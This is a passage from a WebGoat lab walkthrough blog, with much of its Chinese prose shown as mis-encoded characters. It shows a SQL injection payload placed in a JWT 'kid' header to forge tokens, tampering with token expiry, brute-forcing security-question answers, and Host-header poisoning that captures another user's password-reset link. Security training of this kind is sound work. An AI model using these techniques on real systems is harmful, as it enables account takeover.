ä½ç½®æ˜¯å¦ä»ç„¶ç›¸åŒï¼Œå¦‚æœæ²¡æœ‰ï¼Œè¯·æ’¤é”€æ‰€æœ‰ä»¤ç‰Œå¹¶è®©ç”¨æˆ·å†æ¬¡è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p>éœ€è¦åˆ·æ–°ä»¤ç‰Œ<br>
åœ¨æ–°å¼å•é¡µåº”ç”¨ç¨‹åº ï¼ˆSPAï¼‰ ä¸­ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œæ˜¯å¦æœ‰æ„ä¹‰ï¼Ÿæ­£å¦‚æˆ‘ä»¬åœ¨æœ¬èŠ‚ä¸­çœ‹åˆ°çš„ å…³äºå­˜å‚¨ä»¤ç‰Œï¼Œæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼šWeb å­˜å‚¨æˆ– cookieï¼Œè¿™æ„å‘³ç€åˆ·æ–°ä»¤ç‰Œå°±åœ¨ è®¿é—®ä»¤ç‰Œï¼Œå› æ­¤ï¼Œå¦‚æœè®¿é—®ä»¤ç‰Œæ³„éœ²ï¼Œåˆ·æ–°ä»¤ç‰Œä¹Ÿå¯èƒ½è¢«æ³„éœ²ã€‚å¤§å¤šæ•°æ—¶å€™ å½“ç„¶æ˜¯æœ‰åŒºåˆ«çš„ã€‚è®¿é—®ä»¤ç‰Œåœ¨è¿›è¡Œ API è°ƒç”¨æ—¶å‘é€ï¼Œåˆ·æ–°ä»¤ç‰Œä»…å‘é€ ä½•æ—¶åº”è·å–æ–°çš„è®¿é—®ä»¤ç‰Œï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥ä»¤ç‰Œæ˜¯ä¸åŒçš„ç»ˆç»“ç‚¹ã€‚å¦‚æœä½ æœ€ç»ˆå¾—åˆ°åŒæ ·çš„ æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥é€‰æ‹©ä»…ä½¿ç”¨è®¿é—®ä»¤ç‰Œã€‚</p>
<p>å¦‚ä¸Šæ‰€è¿°ï¼Œä½¿ç”¨è®¿é—®ä»¤ç‰Œå’Œå•ç‹¬çš„åˆ·æ–°ä»¤ç‰Œä¸ºæœåŠ¡å™¨æä¾›äº†ä¸€äº›ä¸æ£€æŸ¥çš„æ æ†ä½œç”¨ ä¸€éåˆä¸€éåœ°è®¿é—®ä»¤ç‰Œã€‚ä»…å½“ç”¨æˆ·éœ€è¦æ–°çš„è®¿é—®ä»¤ç‰Œæ—¶æ‰æ‰§è¡Œæ£€æŸ¥ã€‚ å½“ç„¶ï¼Œå¯ä»¥åªä½¿ç”¨è®¿é—®ä»¤ç‰Œã€‚åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ‚¨å­˜å‚¨çš„ä¿¡æ¯ä¸å­˜å‚¨çš„ä¿¡æ¯å®Œå…¨ç›¸åŒ å­˜å‚¨ æœ‰å…³åˆ·æ–°ä»¤ç‰Œï¼Œè¯·å‚é˜…ä¸Šä¸€æ®µã€‚è¿™æ ·ï¼Œæ‚¨æ¯æ¬¡éƒ½éœ€è¦æ£€æŸ¥ä»¤ç‰Œï¼Œä½†è¿™å¯èƒ½ä¼š æ ¹æ®åº”ç”¨è€Œé€‚ç”¨ã€‚å¦‚æœå­˜å‚¨åˆ·æ–°ä»¤ç‰Œç”¨äºéªŒè¯ï¼Œåˆ™ä¿æŠ¤è¿™äº›ä»¤ç‰Œä¹Ÿå¾ˆé‡è¦ï¼ˆè‡³å°‘ ä½¿ç”¨å“ˆå¸Œå‡½æ•°å°†å®ƒä»¬å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼‰ã€‚</p>
<h4 id="10-3">10.</h4>
<p>å°±å¦‚åŒsessionä¼šæœ‰å­˜æ´»æ—¶é•¿ä¸€æ ·ï¼ŒJWTçš„access_tokenä¹Ÿæ˜¯æœ‰ç›¸ç±»ä¼¼çš„æœºåˆ¶ã€‚sessionå¤±æ´»åï¼Œç³»ç»Ÿä¼šè¦æ±‚ç”¨æˆ·å†æ¬¡èº«ä»½éªŒè¯ï¼Œé€šè¿‡åˆ™é‡æ–°é¢å‘sessionï¼›JWTåˆ™å¯ä½¿ç”¨refresh tokenå»åˆ·æ–°access tokenè€Œæ— éœ€å†æ¬¡èº«ä»½éªŒè¯ã€‚<br>
ç™»é™†è·å– access token, refresh token</p>
<p>WebGoatä¸­æåˆ°ï¼š</p>
<p>åº”åœ¨æœåŠ¡å™¨ç«¯å­˜å‚¨è¶³å¤Ÿçš„ä¿¡æ¯ï¼Œä»¥éªŒè¯ç”¨æˆ·æ˜¯å¦ä»ç„¶å—ä¿¡ä»»ã€‚æ‚¨å¯ä»¥è€ƒè™‘çš„äº‹æƒ…æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å­˜å‚¨IPåœ°å€ï¼Œè·Ÿè¸ªä½¿ç”¨refresh tokençš„æ¬¡æ•°ï¼ˆåœ¨access tokençš„æœ‰æ•ˆæ—¶é—´çª—å£ä¸­å¤šæ¬¡ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œå¯èƒ½è¡¨ç¤ºå¥‡æ€ªçš„è¡Œä¸ºï¼Œæ‚¨å¯ä»¥æ’¤é”€æ‰€æœ‰tokenï¼Œè®©ç”¨æˆ·å†æ¬¡è¿›è¡Œèº«ä»½éªŒè¯ï¼‰ã€‚è¿˜è¦è·Ÿè¸ªå“ªä¸ªaccess tokenå±äºå“ªä¸ªrefresh tokenï¼Œå¦åˆ™æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨æ”»å‡»è€…çš„refresh tokenä¸ºå…¶ä»–ç”¨æˆ·è·å–æ–°çš„access tokenï¼Œè¯·å‚é˜…https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation,è¿˜å¯ä»¥æ£€æŸ¥ç”¨æˆ·çš„IPåœ°å€æˆ–åœ°ç†ä½ç½®ã€‚å¦‚æœéœ€è¦å‘å‡ºä¸€ä¸ªæ–°çš„ä»¤ç‰Œï¼Œè¯·æ£€æŸ¥ä½ç½®æ˜¯å¦ä»ç„¶ç›¸åŒï¼Œå¦‚æœä¸åŒï¼Œåˆ™æ’¤é”€æ‰€æœ‰ä»¤ç‰Œï¼Œå¹¶è®©ç”¨æˆ·å†æ¬¡è¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p>è¿™æ®µè¯ä¸­å…³é”®ä¿¡æ¯æ˜¯ï¼ŒæœåŠ¡å™¨ä¸­å¯èƒ½å­˜åœ¨ï¼šæœªæ ¡éªŒaccess tokenå’Œrefresh tokenæ˜¯å¦å±äºåŒä¸€ä¸ªç”¨æˆ·ï¼Œå¯¼è‡´Aç”¨æˆ·å¯ä½¿ç”¨è‡ªå·±çš„refresh tokenå»åˆ·æ–°Bç”¨æˆ·çš„access tokenã€‚<br>
WebGoatå¯¹äºä½¿ç”¨JWTçš„å»ºè®®ï¼š</p>
<blockquote>
<p>ä½¿ç”¨jwtä»¤ç‰Œçš„æœ€ä½³ä½ç½®æ˜¯æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚åœ¨æ™®é€šçš„webåº”ç”¨ç¨‹åºä¸­ï¼Œæœ€å¥½ä½¿ç”¨æ™®é€šçš„æ—§cookiesã€‚</p>
</blockquote>
<p>æ ¹æ®é¢˜æ„ï¼Œæ”»å‡»è€…è¦åˆ©ç”¨Tomè¿‡æœŸçš„åˆ·æ–°tokenæ¥è·å–è®¿é—®tokenï¼Œç”¨Tomçš„è´¦æˆ·è´­ç‰©</p>
<ul>
<li>å¦‚ä½•ä½¿ç”¨åˆ·æ–°tokenï¼š<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000013151506">https://segmentfault.com/a/1190000013151506</a></li>
<li>è¯·æ±‚headerä¿¡æ¯ä¸­éœ€è¦å¸¦ä¸Šauthorization: {$token}</li>
</ul>
<p>ç‚¹å‡»hereå¯ä»¥çœ‹åˆ°log</p>
<p>é‡Œé¢æœ‰token</p>
<p>è§£ç åå¯ä»¥çŸ¥é“æ˜¯tomçš„</p>
<p>ç„¶åç‚¹å‡»è´­ä¹°æŠ“åŒ…</p>
<p>æŠŠtokenæ”¾åœ¨Authorization: åé¢</p>
<p>å‘é€åˆ°repeateræ¨¡å—å¯ä»¥çŸ¥é“è¿™ä¸ªtokenæ˜¯è¿‡æœŸçš„</p>
<blockquote>
<p>æˆæƒæ ‡å¤´çš„ä¸€éƒ¨åˆ†å‘é€,è¿™é€šå¸¸æ˜¯ä½¿ç”¨Bearerä»¤ç‰Œæ ‡å‡†è¿›è¡Œçš„ï¼Œå…¶ä¸­tokenä»¥&quot;Bearer &quot;å‰ç¼€å¼€å¤´ï¼Œåè·Ÿå®é™…çš„tokenå€¼ã€‚</p>
</blockquote>
<p>æˆ‘ä»¬ä¿®æ”¹æ—¶é—´</p>
<blockquote>
<ol>
<li>expï¼ˆExpiration Timeï¼‰ï¼šè¡¨ç¤ºä»¤ç‰Œçš„è¿‡æœŸæ—¶é—´ã€‚å®ƒæ˜¯ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè¡¨ç¤ºä»¤ç‰Œåœ¨ä½•æ—¶è¿‡æœŸã€‚è¯¥æ—¶é—´æˆ³æ˜¯ä½¿ç”¨çºªå…ƒï¼ˆEpochï¼‰æ—¶é—´è¡¨ç¤ºçš„ï¼Œé€šå¸¸æ˜¯ä»¥ç§’ä¸ºå•ä½çš„æ•´æ•°ã€‚</li>
<li>iatï¼ˆIssued Atï¼‰ï¼šè¡¨ç¤ºä»¤ç‰Œçš„ç­¾å‘æ—¶é—´ã€‚å®ƒä¹Ÿæ˜¯ä¸€ä¸ªæ—¶é—´æˆ³ï¼Œè¡¨ç¤ºä»¤ç‰Œæ˜¯åœ¨ä½•æ—¶è¢«ç­¾å‘çš„ã€‚åŒæ ·ï¼Œè¯¥æ—¶é—´æˆ³ä¹Ÿæ˜¯ä½¿ç”¨çºªå…ƒæ—¶é—´è¡¨ç¤ºçš„ã€‚</li>
</ol>
</blockquote>
<p>æ¢ç®—è§„åˆ™æ¯”å¦‚æ˜¯Unixæ—¶é—´æˆ³-&gt;åŒ—äº¬æ—¶é—´</p>
<p>å³1526217811-&gt;2018-05-13 21:23:31</p>
<p>æˆ‘å°±æ˜¯å°½é‡å¤§äº›å°±è¡Œäº†ï¼Œå‘é€å³å¯</p>
<h4 id="11-2">11.</h4>
<p>è¿™é¢˜æˆ‘çœ‹writeupéœ€è¦çœ‹æºç ã€‚ã€‚ã€‚èƒ½æ‰¾å‡ºsqlæ¼æ´</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lusuo/p/17825090.html">webgoat _v8.1å…¨æµç¨‹é€šå…³ - è®©-é›…å…‹-å¢æ¢­ - åšå®¢å›­ (cnblogs.com)</a></p>
<p>ç‚¹å‡»åˆ é™¤ï¼ŒæŠ“åŒ…ï¼Œè·å–token</p>
<p>æ›´æ–°æ•°æ®ï¼Œçœ‹æºç åˆ©ç”¨äº†kidå­˜åœ¨sqlæ³¨å…¥</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot; : &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot; : &quot;&#x27;;select &#x27;MQ==&#x27; from jwt_key --&quot;,</span><br><span class="line">  &quot;typ&quot; : &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;Email&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;Role&quot; : [ &quot;Cat&quot; ],</span><br><span class="line">  &quot;aud&quot; : &quot;webgoat.org&quot;,</span><br><span class="line">  &quot;exp&quot; : 5618905304,</span><br><span class="line">  &quot;iat&quot; : 5524210904,</span><br><span class="line">  &quot;iss&quot; : &quot;WebGoat Token Builder&quot;,</span><br><span class="line">  &quot;sub&quot; : &quot;jerry@webgoat.com&quot;,</span><br><span class="line">  &quot;username&quot; : &quot;Tom&quot;</span><br><span class="line">&#125;</span><br><span class="line">secert_key=1</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Injection/31.png" alt=""></p>
<p>æ›´æ¢tokenå°±è¡Œäº†</p>
<h3 id="3-Password-resetï¼ˆå¯†ç é‡ç½®ï¼‰">3.Password resetï¼ˆå¯†ç é‡ç½®ï¼‰</h3>
<h4 id="2-6">2.</h4>
<p>Letâ€™s first do a simple assignment to make sure you are able to read e-mails with WebWolf, first start WebWolf (see here) In the reset page below send an e-mail to (part behind the @ is not important) Open WebWolf and read the e-mail and login with your username and the password provided in the <a href="mailto:e-mail.username@webgoat.org">e-mail.username@webgoat.org</a></p>
<p>å¤§æ¦‚çš„æ„æ€å°±æ˜¯å«ä½ ç‚¹å‡»å¿˜è®°å¯†ç ç”¨äºé‡ç½®å¯†ç ï¼Œç„¶åä¼šå‘é€ä¸€å°mailç»™WebWolfï¼Œåœ¨WebWolfå°±å¯ä»¥çœ‹åˆ°ä½ çš„æ–°å¯†ç äº†ï¼Œå†å›åˆ°ç™»å½•é¡µé¢é‡æ–°è¾“å…¥è´¦å·å’Œæ–°å¯†ç å°±è¡Œäº†</p>
<h4 id="4-5">4.</h4>
<p>Security questions</p>
<p>This has been an issue and still is for a lot of websites, when you lost your password the website will ask you for a security question which you answered during the sign up process. Most of the time this list contains a fixed number of question and which sometimes even have a limited set of answers. In order to use this functionality a user should be able to select a question by itself and type in the answer as well. This way users will not share the question which makes it more difficult for an attacker.</p>
<p>One important thing to remember the answers to these security question(s) should be treated with the same level of security which is applied for storing a password in a database. If the database leaks an attacker should not be able to perform password reset based on the answer of the security question.</p>
<p>Users share so much information on social media these days it becomes difficult to use security questions for password resets, a good resource for security questions is: <a target="_blank" rel="noopener" href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a><br>
Assignment</p>
<p>Users can retrieve their password if they can answer the secret question properly. There is no lock-out mechanism on this â€˜Forgot Passwordâ€™ page. Your username is â€˜webgoatâ€™ and your favorite color is â€˜redâ€™. The goal is to retrieve the password of another user. Users you could try are: â€œtomâ€, â€œadminâ€ and â€œlarryâ€.</p>
<p>å®‰å…¨é—®é¢˜<br>
è¿™ä¸€ç›´æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå¯¹äºè®¸å¤šç½‘ç«™æ¥è¯´ä»ç„¶æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œå½“æ‚¨ä¸¢å¤±å¯†ç æ—¶ï¼Œç½‘ç«™ä¼šè¯¢é—®æ‚¨ å¯¹äºæ‚¨åœ¨æ³¨å†Œè¿‡ç¨‹ä¸­å›ç­”çš„å®‰å…¨é—®é¢˜ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ­¤åˆ—è¡¨åŒ…å«ä¸€ä¸ªå›ºå®šçš„ é—®é¢˜çš„æ•°é‡ï¼Œæœ‰æ—¶ç”šè‡³æœ‰ä¸€ç»„æœ‰é™çš„ç­”æ¡ˆã€‚ä¸ºäº†ä½¿ç”¨æ­¤åŠŸèƒ½ ç”¨æˆ·åº”è¯¥èƒ½å¤Ÿè‡ªè¡Œé€‰æ‹©é—®é¢˜å¹¶è¾“å…¥ç­”æ¡ˆã€‚è¿™æ ·ç”¨æˆ·å°±ä¸ä¼šå…±äº« è¿™ä¸ªé—®é¢˜ä½¿æ”»å‡»è€…æ›´åŠ å›°éš¾ã€‚</p>
<p>è¦è®°ä½çš„ä¸€ä»¶é‡è¦äº‹æƒ…æ˜¯ï¼Œè¿™äº›å®‰å…¨é—®é¢˜çš„ç­”æ¡ˆåº”è¯¥ä»¥ç›¸åŒçº§åˆ«çš„ ç”¨äºåœ¨æ•°æ®åº“ä¸­å­˜å‚¨å¯†ç çš„å®‰å…¨æ€§ã€‚å¦‚æœæ•°æ®åº“æ³„æ¼ï¼Œæ”»å‡»è€…åº”è¯¥æ— æ³• æ ¹æ®å®‰å…¨é—®é¢˜çš„ç­”æ¡ˆæ‰§è¡Œå¯†ç é‡ç½®ã€‚</p>
<p>å¦‚ä»Šï¼Œç”¨æˆ·åœ¨ç¤¾äº¤åª’ä½“ä¸Šåˆ†äº«å¦‚æ­¤å¤šçš„ä¿¡æ¯ï¼Œå› æ­¤å¾ˆéš¾å°†å®‰å…¨é—®é¢˜ç”¨äºå¯†ç  é‡ç½®ï¼Œå®‰å…¨é—®é¢˜çš„ä¸€ä¸ªå¾ˆå¥½çš„èµ„æºæ˜¯ï¼š <a target="_blank" rel="noopener" href="http://goodsecurityquestions.com/">http://goodsecurityquestions.com/</a></p>
<p>åˆ†é…<br>
å¦‚æœç”¨æˆ·å¯ä»¥æ­£ç¡®å›ç­”å¯†ç é—®é¢˜ï¼Œåˆ™å¯ä»¥æ£€ç´¢å…¶å¯†ç ã€‚æ²¡æœ‰é”å®šæœºåˆ¶ è¿™ä¸ªâ€œå¿˜è®°å¯†ç â€é¡µé¢ã€‚æ‚¨çš„ç”¨æˆ·åæ˜¯â€œwebgoatâ€ï¼Œæ‚¨æœ€å–œæ¬¢çš„é¢œè‰²æ˜¯â€œçº¢è‰²â€ã€‚ç›®æ ‡æ˜¯æ£€ç´¢ å…¶ä»–ç”¨æˆ·çš„å¯†ç ã€‚æ‚¨å¯ä»¥å°è¯•çš„ç”¨æˆ·æ˜¯ï¼šâ€œtomâ€ã€â€œadminâ€å’Œâ€œlarryâ€ã€‚</p>
<p>è¿™é¢˜å°±æ˜¯è¦åœ¨ä¸€ç›´ç”¨æˆ·åçš„æƒ…å†µä¸‹æœå¯»â€œæœ€å–œæ¬¢çš„é¢œè‰²â€</p>
<p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥burpæŠ“åŒ…ï¼ŒåŠ å…¥Intruderæ¨¡å—è¿›è¡Œçˆ†ç ´</p>
<p>è¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·é›†æŸç‚¸å¼¹ï¼ˆç¬¬å››ä¸ªï¼‰ï¼Œå¯¹tomå’Œæœ€å–œæ¬¢çš„é¢œè‰²æ‰“ä¸Šæ ‡è®°</p>
<p>åœ¨payload set 1 æ·»åŠ ä¸Štom admin å’Œ larry</p>
<p>set 2 åŠ å…¥é¢œè‰²å­—å…¸</p>
<blockquote>
<p>å¯ä»¥åœ¨è¿™é‡Œä¸‹è½½ğŸ‘‰https://gist.github.com/mordka/c65affdefccb7264efff77b836b5e717</p>
</blockquote>
<p>å¼€å§‹çˆ†ç ´åï¼ˆå¯èƒ½éœ€è¦å¤šæ¬¡æ‰èƒ½è·å–ç­”æ¡ˆï¼‰ï¼Œé€šè¿‡çŠ¶æ€ç ï¼ˆ200ï¼‰å’Œlengthçš„ä¸åŒå¯»æ‰¾ç­”æ¡ˆ</p>
<blockquote>
<p>å› ä¸ºç­”æ¡ˆæœ€å¤šä¸‰ä¸ªï¼Œç„¶åæˆ‘ä»¬æ‰¾æœ€ä¸åŒçš„å°±è¡Œäº†</p>
</blockquote>
<p>æœ€ç»ˆæ‰¾åˆ°admin:green,tom:purple,larry:yellow</p>
<h4 id="5-9">5.</h4>
<p>å¥½åƒæ˜¯å«é€‰å‡ ä¸ªä¸å®¹æ˜“è¢«æ¨æ–­å‡ºç­”æ¡ˆçš„èº«ä»½éªŒè¯æŠŠã€‚ã€‚ã€‚</p>
<p>è¿™ä¸ªè‡ªå·±é€‰&gt;2ä¸ªå°±è¡Œäº†</p>
<h4 id="6-6">6.</h4>
<p>å…ˆç”¨è‡ªå·±çš„è´¦å·å‘é€é‡ç½®å¯†ç çš„é“¾æ¥</p>
<p>ä¼šæ”¶åˆ°ä¸€å°ä¿¡ï¼Œä¿¡é‡Œæœ‰é‡ç½®å¯†ç çš„é“¾æ¥ï¼Œæ ·å¼ä¸º</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8081/WebGoat/PasswordReset/reset/reset-password/2ad9c8c3-0cdc-4927-950f-ab348005dc4a</span><br></pre></td></tr></table></figure>
<p>åé¢åº”è¯¥æ˜¯ç”¨æˆ·idï¼Œç„¶åä¸»è¦æ˜¯<strong>å› ä¸ºé‡ç½®é“¾æ¥ä¸å˜ä¸”æ°¸ä¹…æœ‰æ•ˆå¯¼è‡´çš„é—®é¢˜</strong>ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠåé¢çš„idæ¢æˆtomçš„å­—ç¬¦ä¸²å°±è¡Œäº†</p>
<p>ä½†æ˜¯å¦‚ä½•è·å–Tomå‘¢</p>
<p>æˆ‘ä»¬å¯ä»¥å‘tomé‚®ç®±å‘é€é‡ç½®é“¾æ¥çš„ä¿¡ï¼Œè™½ç„¶è¿™æ ·å¯ä»¥ç”Ÿæˆtomçš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç™»å½•tomçš„é‚®ç®±</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨å‘tomé‚®ç®±å‘é€é‡ç½®é“¾æ¥çš„ä¿¡æŠ“åŒ…ï¼Œç„¶åä¿®æ”¹host:localhost:8080ä¸º9090,è¿™æ ·çš„è¯æ˜¯è¯·æ±‚ç»è¿‡WebWolf</p>
<blockquote>
<p>åœ¨æ•°æ®åŒ…ä¸­ï¼Œhostè¡¨ç¤ºæ¥æ”¶è¿™ä¸ªè¯·æ±‚çš„ç›®çš„åœ°çš„hostï¼Œä»…åŒ…æ‹¬åŸŸåå’Œç«¯å£å·ã€‚ä¾‹å¦‚ï¼Œ<a target="_blank" rel="noopener" href="http://test.pay.com:8090">test.pay.com:8090</a>ã€‚å®ƒæ˜¯ä¸€ä¸ªç”¨äºæŒ‡å®šè¢«è¯·æ±‚èµ„æºçš„Internetä¸»æœºå’Œç«¯å£å·çš„æ•°æ®åŒ…å¤´å­—æ®µã€‚</p>
</blockquote>
<p>ç„¶åå»webWolfçš„incoming requestæ¨¡å—å¯ä»¥çœ‹åˆ°è¯·æ±‚ï¼ˆæœ€æ–°æ¶ˆæ¯åœ¨æœ€ä¸‹é¢ï¼‰</p>
<p>å‘ç°tomçš„å­—ç¬¦ä¸²ï¼Œæ›¿æ¢é‡ç½®å¯†ç é“¾æ¥åé¢çš„idå°±è¡Œäº†</p>
<h3 id="4-Secure-Passwordsï¼ˆå¯†ç å®‰å…¨ï¼‰">4.Secure Passwordsï¼ˆå¯†ç å®‰å…¨ï¼‰</h3>
<p>å¤§éƒ¨åˆ†éƒ½åœ¨è®²å¦‚ä½•æ„å»ºä¸€ä¸ªå®‰å…¨çš„å¯†ç </p>
<h4 id="4-6">4.</h4>
<p>è¿™ä¸ªæŒºæœ‰æ„æ€çš„ï¼Œå¯ä»¥çŸ¥é“ä½ çš„å¯†ç å¼ºåº¦ï¼ˆé¡ºå¸¦ä¸€ææµ‹è¯•åšä¸»çš„å¯†ç åœ¨ä¸åˆ°2ä¸ªæœˆçš„æ—¶é—´å°±è¢«çˆ†ç ´äº†ã€‚ã€‚ã€‚ï¼‰</p>
<p>æ¢äº†ä¸ªå¼ºåº¦é«˜çš„å¯†ç éœ€è¦100å¤šå¹´æ‰èƒ½çˆ†ç ´ï¼ˆå˜»å˜»ğŸ˜ï¼‰</p>
<h2 id="5-Sensitive-Data-Exposureï¼ˆæ•æ„Ÿæ•°æ®æš´éœ²ï¼‰">5.Sensitive Data Exposureï¼ˆæ•æ„Ÿæ•°æ®æš´éœ²ï¼‰</h2>
<h3 id="1-Insecure-Loginï¼ˆä¸å®‰å…¨ç™»å½•ï¼‰">1.Insecure Loginï¼ˆä¸å®‰å…¨ç™»å½•ï¼‰</h3>
<p>ä¸å®‰å…¨çš„ç™»å½•</p>
<h4 id="2-7">2.</h4>
<p>å…¶å®å°±æ˜¯æ¨¡æ‹Ÿæˆ‘ä»¬æ˜¯ä¸­é—´äºº</p>
<p>è¢«æ”»å‡»äººåœ¨ç™»å½•æ—¶ï¼Œæˆ‘ä»¬æˆªè·æ•°æ®åŒ…ï¼Œå¯ä»¥çœ‹åˆ°ç”¨æˆ·åå’Œå¯†ç æ˜æ–‡ä¼ è¾“</p>
<p>ç›¸å½“äºå°±æ˜¯ä¸å®‰å…¨çš„ç™»å½•</p>
<h2 id="6-XML-External-Entitiesï¼ˆXXEï¼‰ï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰">6.XML External Entitiesï¼ˆXXEï¼‰ï¼ˆXMLå¤–éƒ¨å®ä½“ï¼‰</h2>
<p>æœ¬ èŠ‚ è¯¾ è®² æˆ äº† å¦‚ä½• æ‰§è¡Œ XML å¤–éƒ¨ å®ä½“ æ”»å‡» ï¼Œ ä»¥åŠå¦‚ä½• æ»¥ç”¨ å’Œ é˜²èŒƒ å®ƒã€‚</p>
<h3 id="0-åŸºæœ¬æ¦‚å¿µ">0 åŸºæœ¬æ¦‚å¿µ</h3>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/412746?utm_source=zhihu&amp;utm_medium=bbs-ex&amp;utm_campaign=other&amp;utm_content=content">ã€å®‰å…¨æ”»é˜²ã€‘æ·±å…¥æµ…å‡ºå®æˆ˜ç³»åˆ—ä¸“é¢˜-XXEæ”»å‡»-äº‘ç¤¾åŒº-åä¸ºäº‘ (huaweicloud.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websecurity-study/p/11348913.html">WEBå®‰å…¨â€”â€”XMLæ³¨å…¥ - ç°ç¾½Â· - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yang1234567898/article/details/122484013">ï¼ˆæ¸—é€å­¦ä¹ ï¼‰XXEæ¼æ´åŸç† &amp; æŒ–æ˜ &amp; åˆ©ç”¨ &amp; é˜²å¾¡_xxeæ¼æ´æŒ–æ˜-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45836474/article/details/107573925">XXEæ¼æ´åŸºç¡€åŠç®€å•åˆ©ç”¨_xxeæ¼æ´çš„åˆ©ç”¨æ–¹æ³•-CSDNåšå®¢</a></p>
<p>ï¼ˆè¿™ä¸ªå†™çš„å¾ˆè¯¦ç»†ï¼‰<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">ä»XMLç›¸å…³ä¸€æ­¥ä¸€æ­¥åˆ°XXEæ¼æ´ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p>
</blockquote>
<p>ä¸‹é¢æ˜¯æˆ‘åšçš„ä¸€äº›æ€»ç»“ï¼ˆä¸ç¼ºæ—¶é—´è¿˜æ˜¯å¤šçœ‹çœ‹åˆ«çš„å¤§ä½¬å†™çš„å§ï¼Œæœ¬è’Ÿè’»åªèƒ½æ€»ç»“ä¸€äº›å¤§ä½¬çš„è¯ğŸ˜­ï¼‰</p>
<h4 id="0-XMLåŸºç¡€"><strong>0.XMLåŸºç¡€</strong></h4>
<p>XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆExtensible Markup Language)ï¼Œæ˜¯ä¸€ç§ä¸HTMLç±»ä¼¼çš„çº¯æ–‡æœ¬çš„æ ‡è®°è¯­è¨€ï¼Œè®¾è®¡å®—æ—¨æ˜¯ä¸ºäº†ä¼ è¾“æ•°æ®ï¼Œè€Œéæ˜¾ç¤ºæ•°æ®ã€‚æ˜¯W3Cçš„æ¨èæ ‡å‡†ã€‚</p>
<blockquote>
<p>xmlå’Œhtmlç»“æ„ç±»ä¼¼ï¼Œä¸åŒçš„æ˜¯ï¼š</p>
<ol>
<li><strong>XML è¢«è®¾è®¡ç”¨æ¥ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ã€‚</strong></li>
<li><strong>HTML è¢«è®¾è®¡ç”¨æ¥æ˜¾ç¤ºæ•°æ®ã€‚</strong></li>
</ol>
<p><strong>XML æ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </strong>ï¼ˆåœ¨ä¸‹é¢DTDç»™çš„å®ä¾‹ä»£ç ä¸­å¼ºè°ƒäº†ï¼‰</p>
</blockquote>
<h4 id="1-XMLæ ‡ç­¾"><strong>1.XMLæ ‡ç­¾</strong></h4>
<p>XMLè¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ï¼ŒXMLæ ‡ç­¾æ˜¯æ²¡æœ‰è¢«é¢„å®šä¹‰çš„ï¼Œéœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ä¸æ–‡æ¡£ç»“æ„ã€‚å¦‚ä¸‹ä¸ºåŒ…å«äº†æ ‡é¢˜ã€å‘é€è€…ã€æ¥å—è€…ã€å†…å®¹ç­‰ä¿¡æ¯çš„xmlæ–‡æ¡£ã€‚</p>
<p>æ‰€æœ‰çš„ XML æ–‡æ¡£ï¼ˆä»¥åŠ HTML æ–‡æ¡£ï¼‰å‡ç”±ä»¥ä¸‹ç®€å•çš„æ„å»ºæ¨¡å—æ„æˆï¼š</p>
<ul>
<li>å…ƒç´ </li>
